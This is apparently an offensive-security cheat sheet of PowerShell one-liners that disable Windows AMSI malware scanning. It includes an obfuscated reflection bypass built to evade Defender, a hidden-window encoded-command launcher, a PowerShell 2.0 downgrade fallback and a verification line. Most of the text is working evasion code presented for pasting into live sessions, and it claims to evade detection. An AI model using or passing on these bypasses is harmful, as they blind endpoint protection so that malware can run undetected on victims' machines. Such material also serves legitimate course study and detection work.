OSEP - AMSI Bypass One-Liners
gocheck: AMSI_RESULT_NOT_DETECTED + Defender clean

=== TECHNIQUE ===
- [scriptblock].Assembly instead of [Ref].Assembly
- AmsiUtils found by name via 9 char codes only
- amsiInitFailed found by FieldType==bool + Name.Length==14 (never named)
- SetValue called via variable $sv (no literal .SetValue($null,$true))
- GetFields(40) = NonPublic|Static as raw int

=== RAW (paste into live PS session) ===
$f=(([scriptblock].Assembly.GetTypes()|?{$_.Name-eq(-join[char[]]@(65,109,115,105,85,116,105,108,115))})[0].GetFields(40)|?{$_.FieldType-eq[bool]-and$_.Name.Length-eq14})[0];$sv='SetValue';$f.$sv($null,$true)

=== ENCODED COMMAND (from cmd.exe / WMI / initial shell) ===
powershell -nop -w hidden -enc 

=== PS2 DOWNGRADE FALLBACK (no AMSI in PS 2.0) ===
powershell -version 2 -nop -w hidden -Command "<payload>"

=== VERIFY BYPASS (run after one-liner) ===
([scriptblock].Assembly.GetTypes()|?{$_.Name-eq(-join[char[]]@(65,109,115,105,85,116,105,108,115))})[0].GetFields(40)|?{$_.FieldType-eq[bool]-and$_.Name.Length-eq14}|%{Write-Host "$($_.Name) = $($_.GetValue($null))"}
